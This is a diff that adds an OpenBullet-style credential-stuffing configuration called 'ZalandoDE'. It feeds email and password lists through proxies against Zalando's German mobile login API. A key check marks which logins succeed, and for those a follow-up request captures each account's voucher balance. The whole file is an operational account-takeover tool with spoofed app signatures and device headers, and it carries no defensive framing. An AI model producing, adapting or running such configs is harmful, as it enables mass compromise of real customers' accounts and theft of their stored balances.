@@ -1,0 +1,77 @@
+[SETTINGS]
+{
+  "Name": "ZalandoDE",
+  "SuggestedBots": 100,
+  "LastModified": "2019-05-12T21:29:43.906705-07:00",
+  "AdditionalInfo": "Captures balance. Edited Neura's .fr config to .de",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "JarlosBenda",
+  "Version": "1.2.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.zalando.de/api/mobile/v3/user/login.json" 
+  CONTENT "{\"appVersion\":\"4.38.0\",\"appdomainId\":11,\"deviceLanguage\":\"fr\",\"devicePlatform\":\"android\",\"email\":\"<USER>\",\"password\":\"<PASS>\",\"sig\":\"130a6947e00f39855fded9678f9389c21be4b10c\",\"ts\":1557227553288,\"uuid\":\"10673365-9d73-475c-8233-e18dff7678f9\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "User-Agent: Zalando/4.38.0 (Linux; Android 8.0.0; Genymotion Samsung Galaxy S9/vbox86p-userdebug 8.0.0 OPR6.170623.017 233 test-keys)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "cache-control: private, no-cache, no-store" 
+  HEADER "x-app-domain: 11" 
+  HEADER "x-app-version: 4.38.0" 
+  HEADER "x-uuid: 10673365-9d73-475c-8233-e18dff7678f9" 
+  HEADER "x-ts: 1557227553288" 
+  HEADER "x-device-platform: android" 
+  HEADER "x-device-language: fr" 
+  HEADER "x-sig: 130a6947e00f39855fded9678f9389c21be4b10c" 
+  HEADER "x-os-version: 8.0.0" 
+  HEADER "x-zalando-mobile-app: 1166c0792788b3f3a" 
+  HEADER "x-logged-in: false" 
+  HEADER "content-length: 262" 
+  HEADER "accept-encoding: gzip" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"state\":\"loggedIn\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"state\":\"loggedOut\"" 
+
+REQUEST GET "https://www.zalando.de/api/mobile/v3/user/voucher.json?appdomainId=1&uuid=10673365-9d73-475c-8233-e18dff7678f9&ts=1557227553288&devicePlatform=android&deviceLanguage=de&osVersion=8.0.0&sig=55483ed02f4c147fcd195da1540d9f89fd6aeffc" 
+  
+  HEADER "User-Agent: Zalando/4.38.0 (Linux; Android 8.0.0; Genymotion Samsung Galaxy S9/vbox86p-userdebug 8.0.0 OPR6.170623.017 233 test-keys)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "cache-control: private, no-cache, no-store" 
+  HEADER "x-app-domain: 11" 
+  HEADER "x-app-version: 4.38.0" 
+  HEADER "x-uuid: 10673365-9d73-475c-8233-e18dff7678f9" 
+  HEADER "x-ts: 1557227553288" 
+  HEADER "x-device-platform: android" 
+  HEADER "x-device-language: de" 
+  HEADER "x-sig: 130a6947e00f39855fded9678f9389c21be4b10c" 
+  HEADER "x-os-version: 8.0.0" 
+  HEADER "x-zalando-mobile-app: 1166c0792788b3f3a" 
+  HEADER "x-logged-in: false" 
+  HEADER "content-length: 262" 
+  HEADER "accept-encoding: gzip" 
+
+PARSE "<SOURCE>" JSON "amount" -> CAP "Balance" 
+
